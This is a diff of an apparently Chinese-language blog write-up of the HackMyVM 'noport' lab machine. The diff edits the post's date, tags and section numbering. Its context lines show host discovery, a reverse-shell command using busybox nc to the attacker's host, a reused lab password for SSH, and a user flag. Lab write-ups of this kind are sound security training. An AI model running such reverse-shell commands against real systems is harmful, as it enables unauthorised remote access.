@@ -1,15 +1,15 @@
 ---
 title: hackmyvm-noport
-date: 2025-10-07
+date: 2025-10-02
 categories: [靶机]
-tags: [hmv]     # TAG names should always be lowercase
+tags: [hmv,medium]     # TAG names should always be lowercase
 ---
 
 ### 1.主机发现
 
 靶机ip地址为192.168.56.145
 
-```bash
+```
 └─# arp-scan -l
 Interface: eth0, type: EN10MB, MAC: 00:0c:29:84:cf:10, IPv4: 192.168.56.88
 Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
@@ -338,6 +338,10 @@ if (isset($_GET['uri'])) {
 
 然后我反弹shell `busybox nc 192.168.56.88 1234 -e /bin/bash`，找到用户有一个**akaRed**
 
+
+
+### 4.提权
+
 但他给我的shell不可以进行终端升级，这就有点难受了，硬着头皮发现一个文件,告诉你密码复用
 
 ```
@@ -375,7 +379,7 @@ ssh ph@localhost   密码111
 
 
 
-### 4. flag展示
+### 5. flag展示
 
 ---
 
@@ -388,7 +392,7 @@ user: flag{UR_s0Good*n-n3tvv0rk_For_660930334}
 
 
 
-### 5.收获
+### 6.收获
 
 我们查看防火墙规则
 
